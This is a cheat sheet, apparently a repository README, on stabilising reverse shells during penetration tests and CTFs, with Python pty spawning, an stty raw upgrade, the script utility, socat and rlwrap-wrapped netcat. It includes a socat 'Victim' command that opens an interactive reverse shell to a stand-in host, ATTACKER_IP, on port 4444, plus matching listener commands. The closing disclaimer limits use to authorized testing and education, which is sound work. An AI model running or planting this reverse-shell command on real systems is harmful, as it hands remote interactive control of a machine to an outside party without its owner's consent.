
# Stabilise The Reverse Shell

A collection of techniques to upgrade a basic reverse shell into a fully interactive TTY shell during penetration testing and CTF environments.

## Why Stabilise a Reverse Shell?

A basic reverse shell often has limitations:

- No tab completion
- No command history
- Ctrl+C may terminate the connection
- Poor terminal interaction
- Programs like vim, nano, less, and su may not work properly

Stabilising the shell provides a more interactive and reliable terminal experience.

---

## Method 1 - Python PTY Spawn

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```


Spawns a pseudo-terminal using Python.

---

## Method 2 - Full TTY Upgrade

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo; fg

export TERM=xterm-256color
```
![TTY Upgrade Demo](Screenshot%202025-05-29%20174435.png)

Steps:

1. Spawn a PTY shell.
2. Background the session using `CTRL + Z`.
3. Configure local terminal with `stty raw -echo`.
4. Bring the shell back using `fg`.
5. Set terminal type.

This method provides a near fully interactive shell.

---

## Method 3 - Script Utility

```bash
script -qc /bin/bash /dev/null
```

Uses the Linux `script` utility to create a pseudo-terminal.

---

## Method 4 - Socat Shell

### Listener

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### Victim

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

Replace:

```text
ATTACKER_IP
```

with your listener IP address.

Socat provides one of the most stable reverse shells available.

---

## Method 5 - RLWrap

```bash
rlwrap -f . -r nc -nvlp 4444
```

Adds:

* Command history
* Better terminal interaction
* Improved shell usability

when working with Netcat listeners.

---

## References

* Python PTY
* Socat
* Netcat
* RLWrap
* Linux TTY Management

---

## Disclaimer

This repository is intended for:

* Authorized penetration testing
* Security research
* Capture The Flag (CTF) challenges
* Educational purposes

Use only on systems you own or have explicit permission to test.

